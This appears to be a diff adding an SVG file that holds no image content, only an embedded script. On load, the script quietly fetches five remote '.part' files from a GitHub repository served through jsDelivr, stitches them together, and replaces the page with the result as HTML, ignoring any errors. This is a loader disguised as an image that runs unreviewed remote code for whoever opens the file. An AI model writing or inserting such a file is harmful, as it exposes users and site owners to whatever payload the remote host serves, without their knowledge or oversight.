@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[
+(async()=>{try{
+const u=["https://cdn.jsdelivr.net/gh/RainDrop-Proxy/project-c@main/g/8178116004/0.part","https://cdn.jsdelivr.net/gh/RainDrop-Proxy/project-c@main/g/8178116004/1.part","https://cdn.jsdelivr.net/gh/RainDrop-Proxy/project-c@main/g/8178116004/2.part","https://cdn.jsdelivr.net/gh/RainDrop-Proxy/project-c@main/g/8178116004/3.part","https://cdn.jsdelivr.net/gh/RainDrop-Proxy/project-c@main/g/8178116004/4.part"];
+const t=await Promise.all(u.map(x=>fetch(x).then(r=>r.text())));
+location.replace(URL.createObjectURL(new Blob([t.join('')],{type:'text/html'})));
+}catch(e){}})();
+]]></script></svg>
